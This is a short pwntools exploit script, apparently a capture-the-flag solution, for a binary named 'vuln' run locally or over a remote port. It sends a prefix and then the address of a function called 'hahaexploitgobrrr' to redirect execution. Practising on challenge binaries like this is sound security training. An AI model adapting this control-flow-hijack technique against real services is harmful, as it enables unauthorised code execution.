#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./vuln")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
context.log_level = "DEBUG"

io.send(b"IYL")
io.send(p32(binary.symbols["hahaexploitgobrrr"]))
io.send(b"E")
print(io.recvall(1).decode("utf-8", errors="replace"))
